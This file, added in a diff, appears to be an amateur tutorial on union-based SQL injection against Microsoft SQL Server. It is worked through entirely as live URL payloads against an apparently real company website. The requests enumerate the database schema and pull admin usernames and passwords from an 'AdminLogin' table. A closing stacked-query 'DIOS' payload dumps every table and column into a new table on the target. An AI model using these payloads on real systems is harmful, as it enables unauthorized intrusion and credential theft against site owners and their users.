@@ -1,0 +1,108 @@
+
+
+
+                                             MS SQL INJECTION union based
+											 
+											 
+											 
+
+http://aquaservices.co.in/Product.aspx?Id=13--
+working fine.
+http://aquaservices.co.in/Product.aspx?Id=13 order by 1--
+No Error
+http://aquaservices.co.in/Product.aspx?Id=13 order by 100--
+Here comes the error : The order by position number 100 is out of range of the number of items
+
+
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union Select 1,2,3,4,5,6,7,8--
+Again we got a error : Operand Type Clash: text is incompatible with int
+
+
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union Select null,null,null,null,null,null,null,null--
+Again we got a error : The text data type cannot be selected as DISTINCT because it is not comparable.
+
+
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select null,null,null,null,null,null,null,null--
+Again we got a error : Conversion from type 'DBNull' to type 'String' is not valid. Also known as Datatype Mistmatch Error
+
+
+Now we can Put @@version on place of vulnerable column to get the current version from database.
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,@@version,3,4,5,6,db_name(),8--
+
+
+And we got the version, now we can get the current database name using db_name().
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,db_name(),3,4,5,6,db_name(),8--
+
+
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,table_name,3,4,5,6,db_name(),8 from (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc--
+We got the first table name : AdminLogin
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,table_name,3,4,5,6,db_name(),8 from (select top 2 table_name from information_schema.tables order by 1) as shit order by 1 desc--
+We got the second table name : Certificate
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,table_name,3,4,5,6,db_name(),8 from (select top 3 table_name from information_schema.tables order by 1) as shit order by 1 desc--
+We got the Forth table name : ClientList
+
+
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,column_name,3,4,5,6,db_name(),8 from (select top 1 column_name from information_schema.columns where table_name='AdminLogin' order by 1) as shit order by 1 desc--
+We got the first column from AdminLogin Table : IsActive
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,column_name,3,4,5,6,db_name(),8 from (select top 2 column_name from information_schema.columns where table_name='AdminLogin' order by 1) as shit order by 1 desc--
+We got the Second column from AdminLogin Table : Password
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,column_name,3,4,5,6,db_name(),8 from (select top 4 column_name from information_schema.columns where table_name='AdminLogin' order by 1) as shit order by 1 desc--
+We got the Third column from AdminLogin Table : UserName
+
+
+
+We got the table names the column names and now lets extrct the data from them. For concatination we can use %2b which is +.
+http://aquaservices.co.in/Product.aspx?Id=13 and 0=1 Union All Select 1,username%2b' '%2bpassword,3,4,5,6,db_name(),8 from AdminLogin--
+
+
+Now in the end i will like to show you how to make the whole process alot faster by using MSSQL DIOS
+http://aquaservices.co.in/Product.aspx?Id=13;begin declare @x varchar(8000), @y int, @z varchar(50), @a varchar(100) declare @myTbl table (name varchar(8000) not null) SET @y=1 SET @x='injected by ZEN :: 
+'%2b@@version%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Database : '%2bdb_name()%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @z='' SET @a='' WHILE @y<=(SELECT COUNT(table_name) 
+from INFORMATION_SCHEMA.TABLES) begin SET @a='' Select @z=table_name from INFORMATION_SCHEMA.TABLES where TABLE_NAME not in (select name from @myTbl) select @a=@a %2b column_name%2b' : ' 
+from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=@z insert @myTbl values(@z) SET @x=@x %2b  CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Table: '%2b@z%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62)%2b'Columns
+ : '%2b@a%2b CHAR(60)%2bCHAR(98)%2bCHAR(114)%2bCHAR(62) SET @y = @y%2b1 end select @x as output into temp_dios_sample END--
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+											 
